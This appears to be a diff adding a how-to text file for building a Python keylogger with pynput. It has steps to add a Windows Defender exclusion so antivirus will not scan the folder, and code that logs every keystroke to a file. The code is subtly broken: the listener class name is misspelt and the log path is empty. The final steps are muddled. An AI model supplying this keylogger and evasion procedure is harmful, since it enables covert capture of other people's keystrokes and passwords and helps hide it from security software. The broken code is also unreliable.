@@ -1,0 +1,61 @@
+Open Python IDLE 
+
+GO to files > click save as > copy that folder's path
+
+paste that path which is copied ------> in cmd
+
+to install library:
+
+pip install pynput
+
+press enter and the library will be downloaded
+
+Create and empty folder anywhere (on drive E/C/D) > name it as "keylogger" 
+
+search for "Virus and Threat Protection" > Manage Settings. > add/remove exclusions 
+
+Add Exclusion > Folder > keylogger
+
+
+Open Idle > write code >
+-----------------------------------------------
+import pynput
+from pynput.keyboard import Key,Listener
+import logging
+
+log_dir = r""
+logging.basicConfig(filename=(log_dir+ r"MY_LOG.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')
+
+
+def on_press(key):
+  logging.info(str(key))
+  
+with Listner(on_press=on_press) as listener:
+  listener.join()
+  
+-----------------------------------------------
+
+Save this file in the "keylogger" folder
+
+
+
+Run the program and enter 1
+2
+3
+4
+5
+6
+
+
+_________________________
+
+find the my_log.txt in the "keylogger.txt"  folder
+
+
+all the keys are recorded in the logs
+
+
+
+
+
+
